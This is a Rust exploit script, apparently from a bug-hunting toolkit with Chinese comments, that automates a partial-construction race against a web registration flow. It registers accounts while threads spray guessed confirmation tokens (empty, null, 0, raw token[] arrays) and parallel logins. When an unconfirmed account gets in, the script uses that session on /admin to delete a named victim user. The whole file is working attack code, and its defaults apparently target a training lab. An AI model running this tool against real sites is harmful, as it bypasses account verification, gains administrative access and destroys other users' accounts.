#!/usr/bin/env rust-script
//! name: pcreg_race
//! description: 半构造注册竞态驱动器(partial-construction registration race)- 写侧注册与读侧同窗齐放:确认 worker 以短间隔连续播撒候选 token 电池(空/0/null/false/Array/用户名/邮箱/csrf),每轮注册一个新账号并从独立会话连投登录(会话锁天然把登录摊在窗口上);任一读侧离开基线(确认 400/403、登录非 Invalid username or password)即命中并自动复验登录,可选经 /admin 删除指定用户;一个信封给出逐候选状态直方图、命中项、逐轮注册耗时与复验/删除回执。--raw-param 候选原样入 URL 不编码,可发字面 token[] 数组形。
//! version: 1.0.2
//! args: <base-url> [--email-domain ginandjuice.shop] [--tag S] [--rounds N] [--logins-per-round N] [--workers N] [--interval-ms N] [--candidates 'a,b,c'] [--password P] [--raw-param] [--verify-polls N] [--delete-user U] [--snippet N] [--timeout-ms N] [--selftest]
//! keywords: 漏洞猎手套件, 竞态, race, partial construction, 半构造, 注册, confirm, 播撒, spread
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! ```
use pi_rust_lib::report;
use pi_rust_lib::serde_json::{json, Map, Value};
use std::collections::BTreeMap;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

struct Resp {
    status: u16,
    body: String,
    cookie: Option<String>,
    ms: u128,
}

fn send(
    agent: &ureq::Agent,
    method: &str,
    url: &str,
    cookie: Option<&str>,
    body: Option<&str>,
) -> Resp {
    let t0 = Instant::now();
    let mut req = agent.request(method, url);
    if let Some(c) = cookie {
        req = req.set("Cookie", c);
    }
    if body.is_some() {
        req = req.set("Content-Type", "application/x-www-form-urlencoded");
    }
    let out = match body {
        Some(b) => req.send_string(b),
        None => req.call(),
    };
    let ms = t0.elapsed().as_millis();
    match out {
        Ok(r) => {
            let status = r.status();
            let cookie = r.header("set-cookie").map(|s| s.split(';').next().unwrap_or("").to_string());
            let body = r.into_string().unwrap_or_default();
            Resp { status, body, cookie, ms }
        }
        Err(ureq::Error::Status(code, r)) => {
            let cookie = r.header("set-cookie").map(|s| s.split(';').next().unwrap_or("").to_string());
            let body = r.into_string().unwrap_or_default();
            Resp { status: code, body, cookie, ms }
        }
        Err(e) => Resp { status: 0, body: format!("transport error: {e}"), cookie: None, ms },
    }
}

fn csrf_of(html: &str) -> Option<String> {
    let idx = html.find("name=\"csrf\"")?;
    let rest = &html[idx..];
    let v = rest.find("value=")?;
    let rest = rest[v + 6..].trim_start();
    let quote = rest.chars().next()?;
    if quote != '"' && quote != '\'' {
        return None;
    }
    let rest = &rest[1..];
    let end = rest.find(quote)?;
    Some(rest[..end].to_string())
}

fn snippet(s: &str, n: usize) -> String {
    let t: String = s.split_whitespace().collect::<Vec<_>>().join(" ");
    if t.chars().count() > n {
        t.chars().take(n).collect::<String>() + "..."
    } else {
        t
    }
}

fn arg(args: &[String], i: usize) -> String {
    args.get(i + 1).cloned().unwrap_or_default()
}

/// Confirm target: --raw-param emits the candidate unencoded so literal
/// `token[]` reaches PHP (PHP does not decode %5B%5D inside a parameter
/// name, the encoded form reads as `token`).
fn confirm_target(base_confirm: &str, cand: &str, raw: bool) -> String {
    let v = if raw { cand.to_string() } else { urlencode(cand) };
    format!("{base_confirm}?token={v}")
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let sample = "<input required type=\"hidden\" name=\"csrf\" value=\"AbC123\">";
        let ok = csrf_of(sample).as_deref() == Some("AbC123")
            && snippet("a b c", 2) == "a ..."
            && confirm_target("https://x/confirm", "[]", true) == "https://x/confirm?token=[]"
            && confirm_target("https://x/confirm", "[]", false) == "https://x/confirm?token=%5B%5D";
        println!(
            "{}",
            json!({"action": "pcreg_race", "data": {"selftest": ok}, "success": ok})
        );
        std::process::exit(if ok { 0 } else { 1 });
    }

    let mut base = String::new();
    let mut domain = "ginandjuice.shop".to_string();
    let mut tag = "pcr".to_string();
    let mut rounds = 12usize;
    let mut logins_per_round = 6usize;
    let mut workers = 4usize;
    let mut interval_ms = 8u64;
    let mut candidates: Vec<String> = vec![
        String::new(),
        String::new(),
        String::new(),
        String::new(),
        "0".into(),
        "null".into(),
        "NULL".into(),
        "false".into(),
        "Array".into(),
        "undefined".into(),
        "00000000000000000000000000000000".into(),
    ];
    let mut password = "peter123".to_string();
    let mut raw_param = false;
    let mut verify_polls = 3usize;
    let mut delete_user = String::new();
    let mut snip = 80usize;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--email-domain" => domain = arg(&args, i),
            "--tag" => tag = arg(&args, i),
            "--rounds" => rounds = arg(&args, i).parse().unwrap_or(rounds),
            "--logins-per-round" => logins_per_round = arg(&args, i).parse().unwrap_or(logins_per_round),
            "--workers" => workers = arg(&args, i).parse().unwrap_or(workers).clamp(1, 12),
            "--interval-ms" => interval_ms = arg(&args, i).parse().unwrap_or(interval_ms),
            "--candidates" => {
                candidates = arg(&args, i)
                    .split(',')
                    .map(|s| s.to_string())
                    .collect::<Vec<_>>();
            }
            "--password" => password = arg(&args, i),
            "--raw-param" => raw_param = true,
            "--verify-polls" => verify_polls = arg(&args, i).parse().unwrap_or(verify_polls),
            "--delete-user" => delete_user = arg(&args, i),
            "--snippet" => snip = arg(&args, i).parse().unwrap_or(snip),
            other if !other.starts_with("--") && base.is_empty() => base = other.trim_end_matches('/').to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        report::failure(
            "pcreg_race",
            "usage",
            "call as: pcreg_race <base-url> --rounds 12 --workers 4 --logins-per-round 6 --delete-user victim",
        );
        std::process::exit(2);
    }

    let agent = ureq::AgentBuilder::new()
        .timeout(Duration::from_secs(25))
        .build();

    // ---- register session (write face) -------------------------------------
    let reg_page = send(&agent, "GET", &format!("{base}/register"), None, None);
    let mut reg_cookie = reg_page.cookie.clone();
    let reg_csrf = match csrf_of(&reg_page.body) {
        Some(c) => c,
        None => {
            report::failure("pcreg_race", "no csrf on /register", &snippet(&reg_page.body, 200));
            std::process::exit(2);
        }
    };

    // ---- login session (second read face, own session => no lock contention) -
    let login_page = send(&agent, "GET", &format!("{base}/login"), None, None);
    let login_cookie = login_page.cookie.clone();
    let login_csrf = csrf_of(&login_page.body).unwrap_or_default();

    let stop = Arc::new(AtomicBool::new(false));
    let hits: Arc<Mutex<Vec<Value>>> = Arc::new(Mutex::new(Vec::new()));
    let cands: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(candidates.clone()));
    let counts: Arc<Mutex<BTreeMap<String, BTreeMap<String, usize>>>> =
        Arc::new(Mutex::new(BTreeMap::new()));
    let sent = Arc::new(Mutex::new(0usize));

    let mut handles = Vec::new();
    for _w in 0..workers {
        let stop = stop.clone();
        let hits = hits.clone();
        let cands = cands.clone();
        let counts = counts.clone();
        let sent = sent.clone();
        let agent = agent.clone();
        let url = format!("{base}/confirm");
        let raw_param = raw_param;
        handles.push(std::thread::spawn(move || {
            let mut idx = 0usize;
            while !stop.load(Ordering::SeqCst) {
                let cand = {
                    let list = cands.lock().unwrap_or_else(|e| e.into_inner());
                    if list.is_empty() {
                        String::new()
                    } else {
                        list[idx % list.len()].clone()
                    }
                };
                idx += 1;
                let target = confirm_target(&url, &cand, raw_param);
                let r = send(&agent, "POST", &target, None, None);
                *sent.lock().unwrap_or_else(|e| e.into_inner()) += 1;
                {
                    let mut c = counts.lock().unwrap_or_else(|e| e.into_inner());
                    let e = c
                        .entry(if cand.is_empty() { "<empty>".to_string() } else { cand.clone() })
                        .or_default()
                        .entry(r.status.to_string())
                        .or_insert(0);
                    *e += 1;
                }
                if r.status != 400 && r.status != 403 {
                    hits.lock().unwrap_or_else(|e| e.into_inner()).push(json!({
                        "face": "confirm",
                        "candidate": cand,
                        "status": r.status,
                        "body": snippet(&r.body, snip),
                    }));
                }
                std::thread::sleep(Duration::from_millis(interval_ms.max(1)));
            }
        }));
    }

    let mut round_log: Vec<Value> = Vec::new();
    let mut winner: Option<(String, String)> = None;

    for r in 0..rounds {
        let user = format!("{tag}{}", r + 1);
        let email = format!("{user}@{domain}");
        // refresh candidates with round-specific guesses
        {
            let mut list = cands.lock().unwrap_or_else(|e| e.into_inner());
            list.truncate(candidates.len());
            list.push(user.clone());
            list.push(email.clone());
            list.push(reg_csrf.clone());
            list.push(password.clone());
        }
        // re-read the register page each round: fresh csrf if the app rotates it
        let page = send(&agent, "GET", &format!("{base}/register"), reg_cookie.as_deref(), None);
        if let Some(c) = &page.cookie {
            reg_cookie = Some(c.clone());
        }
        let csrf = csrf_of(&page.body).unwrap_or_else(|| reg_csrf.clone());
        let form = format!(
            "csrf={}&username={}&email={}&password={}",
            urlencode(&csrf),
            urlencode(&user),
            urlencode(&email),
            urlencode(&password)
        );
        let reg_url = format!("{base}/register");
        let reg_cookie_c = reg_cookie.clone();
        let reg_agent = agent.clone();
        let form_c = form.clone();
        let t0 = Instant::now();
        let reg_handle = std::thread::spawn(move || {
            send(&reg_agent, "POST", &reg_url, reg_cookie_c.as_deref(), Some(&form_c))
        });
        // second read face: serialized logins on one foreign session, spread by the session lock
        let mut login_statuses: Vec<u16> = Vec::new();
        let login_body = format!(
            "csrf={}&username={}&password={}",
            urlencode(&login_csrf),
            urlencode(&user),
            urlencode(&password)
        );
        let login_url = format!("{base}/login");
        let mut login_hit = false;
        for _ in 0..logins_per_round {
            let r = send(&agent, "POST", &login_url, login_cookie.as_deref(), Some(&login_body));
            login_statuses.push(r.status);
            if r.status != 200 || !r.body.contains("Invalid username or password") {
                login_hit = true;
                hits.lock().unwrap_or_else(|e| e.into_inner()).push(json!({
                    "face": "login",
                    "user": user,
                    "status": r.status,
                    "body": snippet(&r.body, snip),
                }));
                break;
            }
        }
        let reg = reg_handle.join().unwrap_or(Resp {
            status: 0,
            body: "join failed".into(),
            cookie: None,
            ms: 0,
        });
        let reg_ok = reg.status == 200 && !reg.body.contains("Invalid email address");
        round_log.push(json!({
            "round": r + 1,
            "user": user,
            "email": email,
            "register_status": reg.status,
            "register_ms": reg.ms,
            "register_ok": reg_ok,
            "login_statuses": login_statuses,
            "login_hit": login_hit,
            "elapsed_ms": t0.elapsed().as_millis(),
        }));
        if login_hit {
            winner = Some((user.clone(), password.clone()));
            break;
        }
    }

    // ---- verification: is any registered account usable? -------------------
    let mut verified: Vec<Value> = Vec::new();
    let mut admin_receipt: Option<Value> = None;
    let mut winner_cookie: Option<String> = None;
    if winner.is_none() {
        // even without an in-band hit, check the last rounds' accounts
        for rl in round_log.iter().rev().take(verify_polls) {
            if let (Some(user), true) = (rl.get("user").and_then(|v| v.as_str()), true) {
                if rl.get("register_ok").and_then(|v| v.as_bool()) != Some(true) {
                    continue;
                }
                let page = send(&agent, "GET", &format!("{base}/login"), None, None);
                let cookie = page.cookie.clone();
                let csrf = csrf_of(&page.body).unwrap_or_default();
                let body = format!(
                    "csrf={}&username={}&password={}",
                    urlencode(&csrf),
                    urlencode(&user),
                    urlencode(&password)
                );
                let r = send(&agent, "POST", &format!("{base}/login"), cookie.as_deref(), Some(&body));
                let ok = r.status != 200 || !r.body.contains("Invalid username or password");
                verified.push(json!({
                    "user": user, "status": r.status, "usable": ok,
                    "location": "", "body": if ok { snippet(&r.body, snip) } else { String::new() },
                }));
                if ok {
                    winner = Some((user.to_string(), password.clone()));
                    winner_cookie = cookie;
                    break;
                }
            }
        }
    } else if let Some((user, _)) = winner.clone() {
        let page = send(&agent, "GET", &format!("{base}/login"), None, None);
        let cookie = page.cookie.clone();
        let csrf = csrf_of(&page.body).unwrap_or_default();
        let body = format!(
            "csrf={}&username={}&password={}",
            urlencode(&csrf),
            urlencode(&user),
            urlencode(&password)
        );
        let r = send(&agent, "POST", &format!("{base}/login"), cookie.as_deref(), Some(&body));
        verified.push(json!({"user": user, "status": r.status, "usable": r.status != 200 || !r.body.contains("Invalid username or password")}));
        winner_cookie = cookie;
    }

    stop.store(true, Ordering::SeqCst);
    for h in handles {
        let _ = h.join();
    }

    if !delete_user.is_empty() {
        if let Some(cookie) = winner_cookie.clone() {
            let admin = send(&agent, "GET", &format!("{base}/admin"), Some(&cookie), None);
            let csrf = csrf_of(&admin.body).unwrap_or_default();
            let body = format!("csrf={}&username={}", urlencode(&csrf), urlencode(&delete_user));
            let del = send(&agent, "POST", &format!("{base}/admin/delete"), Some(&cookie), Some(&body));
            admin_receipt = Some(json!({
                "admin_status": admin.status,
                "csrf_found": !csrf.is_empty(),
                "delete_status": del.status,
                "delete_body": snippet(&del.body, snip),
            }));
        }
    }

    let counts_v: Value = {
        let c = counts.lock().unwrap_or_else(|e| e.into_inner());
        let mut m = Map::new();
        for (cand, st) in c.iter() {
            let mut sm = Map::new();
            for (s, n) in st.iter() {
                sm.insert(s.clone(), json!(n));
            }
            m.insert(cand.clone(), Value::Object(sm));
        }
        Value::Object(m)
    };
    let hits_v: Value = Value::Array(hits.lock().unwrap_or_else(|e| e.into_inner()).clone());
    let sent_n = *sent.lock().unwrap_or_else(|e| e.into_inner());

    let solved = admin_receipt
        .as_ref()
        .and_then(|a| a.get("delete_status"))
        .and_then(|s| s.as_u64())
        .map(|s| s < 400)
        .unwrap_or(false);
    let data = json!({
        "result": if solved { "lab-solved" } else { "race-run" },
        "base": base,
        "register_csrf": reg_csrf,
        "login_csrf_present": !login_csrf.is_empty(),
        "confirm_requests": sent_n,
        "confirm_status_by_candidate": counts_v,
        "hits": hits_v,
        "rounds": round_log,
        "verified": verified,
        "winner": winner.as_ref().map(|(u, p)| json!({"user": u, "password": p})),
        "admin": admin_receipt,
    });
    let _ = report::success(
        "pcreg_race",
        data,
        "hits/winner non-empty => re-verify with http_session login then delete the victim via /admin",
    );
}

fn urlencode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}
